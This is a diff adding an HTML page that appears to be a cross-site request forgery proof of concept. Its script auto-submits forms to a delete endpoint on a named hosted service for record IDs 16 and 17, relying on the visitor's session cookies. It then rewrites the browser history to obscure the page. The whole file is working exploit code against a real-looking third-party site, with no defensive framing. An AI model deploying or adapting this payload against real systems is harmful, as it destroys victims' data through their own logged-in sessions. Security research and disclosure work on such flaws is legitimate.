@@ -1,0 +1,32 @@
+<!doctype html>
+<html>
+  <body>
+    <script>
+      const ids = [16,17]; // <-- IDs to iterate
+      const base = "https://inspective.leaddocket.com/managereferralsources/delete";
+      const delayMs = 500;
+
+      ids.forEach((id, i) => {
+        setTimeout(() => {
+          const form = document.createElement("form");
+          form.method = "GET"; // explicit
+          form.action = `${base}/${encodeURIComponent(id)}`;
+
+          // If you want to avoid navigating away, open each in new tab
+          // but the key is: cookie-sending depends on FORM submit, not open()
+          form.target = "_blank";
+
+          document.body.appendChild(form);
+          form.submit();
+
+          // cleanup
+          setTimeout(() => {
+            if (form.parentNode) form.parentNode.removeChild(form);
+          }, 3000);
+        }, i * delayMs);
+      });
+
+      try { history.pushState('', '', '/'); } catch(e) {}
+    </script>
+  </body>
+</html>
